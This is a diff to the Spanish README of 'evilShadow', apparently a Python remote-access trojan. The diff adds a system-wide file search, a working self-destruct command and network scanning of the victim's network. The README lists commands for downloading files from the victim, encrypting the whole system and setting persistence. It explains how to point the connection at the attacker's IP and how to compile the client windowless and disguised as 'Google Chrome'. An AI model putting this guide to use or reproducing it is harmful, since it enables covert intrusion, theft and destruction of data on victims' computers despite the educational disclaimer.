@@ -1,11 +1,13 @@
 # evilShadow
 
-RECUERDA: Este repositorio es para el aprenzidaje y educación, no me hago respondable del mal uso que se le puede dar!
+**RECUERDA**: Este repositorio es para el aprenzidaje y educación, no me hago respondable del mal uso que se le puede dar!
 
 
 # Novedades
 
-- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (En mejora).
+- Buscar TODOS los archivos por extension del sistema
+- Autodestrucción
+- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (Mejorado (en mejora)).
 - Escanear la red de la victima
 - Escanera puertos de host dentro de la red de la victima
 
@@ -17,6 +19,8 @@ RECUERDA: Este repositorio es para el aprenzidaje y educación, no me hago respo
 ```
                 Aviable Commands:
 
+                    | [!>] search <extension> -> Search for files with named extension
+                    ---------------------------------------------------------
                     | [!>] downloadDir <path> -> Download A full dir
                     ---------------------------------------------------------
                     | [!>] download <path> -> Download A File From Target PC
@@ -57,7 +61,7 @@ RECUERDA: Este repositorio es para el aprenzidaje y educación, no me hago respo
                     ---------------------------------------------------------
                     | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                     ---------------------------------------------------------
-                    | [!>] destruction     -> (N/A) Eliminate all and close conect
+                    | [!>] destruction     -> Eliminate ALL and close conex
                     --------------------------------------------------------- 
                     | [!>] q               -> Suspend the conection
                     ---------------------------------------------------------
@@ -99,15 +103,11 @@ Automated:
 
 - ```pip install -r requirements.txt```
 
-Manal:
-
-- ```pip install prompt_toolkit  colorama psutil cryptography requests pillow pynput pyinstaller```
-
 
 # Errors:
 
 - Si tenemos errores con las librerias (module not found):
-  - ```pip install prompt_toolkit  colorama psutil cryptography requests pillow pynput pyinstaller``` 
+  - ```pip install nmap_vscan_fix prompt_toolkit colorama cryptography requests pynput certifi cffi charset-normalizer idna Pillow psutil pycparser requests six urllib3 pyinstaller ``` 
 
 
 - Si tenemos el error **"pyinstaller not found"** en el **nuevo entorno**!
@@ -118,16 +118,22 @@ Manal:
             D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe
             C:\Program Files\Python310\Scripts\pyinstaller.exe``
     
-      - Usar ruta completa de pyinstaller (nuevo)
+      - Usar ruta completa de pyinstaller (nuevo!)
       
              D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe --noconsole ....
-    
 
+    - **Linux**
+      - whereis pyinstaller
+        
+            pyinstaller: /home/supervisor/ALL_MINE/Ramsomware/new/bin/pyinstaller /home/supervisor/.local/bin/pyinstaller
+      - Usar ruta completa de pyinstaller (nuevo!)
+
+             /home/supervisor/ALL_MINE/Ramsomware/new/bin/pyinstaller --noconsole --noupx ....
 
 # Preparación:
 
 
-En el script **Connection.py** en la línea *239* tenemos la línea que crea la conexión. La modificamos a la direccion ip
+En el script **Connection.py** en la línea **350** tenemos la línea que crea la conexión. La modificamos a la direccion ip
 del atacante
 
 -     sock.connect ( ( '127.0.0.1' ,1337) )
@@ -154,14 +160,24 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 
   ### Linux:
   
-  `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
+    `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
 
 
 # Funciones (EXPLICAIÓN)
 
-  - **Download**
-    - Con el comando "Download" podemos descargarnos archivos de la máquina remota
+TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
+    (av, search <ext>, startTask, check, sysinfo, persistence, lowsersistence, scanhost <host>)
+
+
+  - **search**
+    - Con este comando buscamos en todo el sistema archivos con la extension deseada
+      - `search pdf`
+
+
+  - **download**
+    - Con el comando "download" podemos descargarnos archivos de la máquina remota
       - `download /home/supervisor/Desktop/Passwords.txt`
+
 
   - **downloadDir**
     - Con el comando "downloadDir" podemos descargarnos la estructura completa de la carpeta
@@ -258,6 +274,10 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
     - Suspend the connection
       - ``q``
 
+
+  - **destruction**
+    - Elimina TODOS los archivos dropeados incluido el binario, mata los subprocesos y cierra la conexión
+      - ``destruction``
 
   - **exit**
     - Close the conecction
